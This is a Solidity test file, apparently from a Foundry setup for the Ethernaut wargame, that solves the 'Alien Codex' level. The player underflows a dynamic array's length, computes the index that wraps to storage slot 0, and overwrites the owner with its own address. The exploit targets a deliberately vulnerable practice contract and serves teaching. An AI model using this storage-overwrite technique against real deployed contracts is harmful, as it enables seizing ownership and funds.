// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {AlienCodex, AlienCodexFactory} from "../helpers/AlienCodexFactory.sol";

contract AlienCodexLevel is SetUpLevelTest {
    AlienCodex internal alienCodex;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 0.01 ether;
        instanceBalance = 0 ether;
        level = address(new AlienCodexFactory());
        super.setUp();
        alienCodex = AlienCodex(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 n = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 i;
        unchecked {
            i -= n;
        }
        alienCodex.revise(i, bytes32(uint256(uint160(player))));
        vm.stopPrank();
    }
}
